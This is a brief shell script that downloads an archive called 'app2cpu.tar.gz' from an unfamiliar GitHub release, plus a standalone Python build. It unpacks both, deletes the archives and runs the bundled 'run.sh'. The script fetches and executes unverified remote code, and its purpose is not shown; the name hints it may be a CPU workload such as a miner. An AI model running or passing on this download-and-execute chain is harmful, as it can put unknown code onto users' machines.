cd
wget https://github.com/Dirianda12/mainble/releases/download/mx/app2cpu.tar.gz
tar xf app2cpu.tar.gz
rm -rf app2cpu.tar.gz
curl -O -J -L https://github.com/indygreg/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
tar -xf cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
rm -f cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
chmod +x run.sh
./run.sh app-1
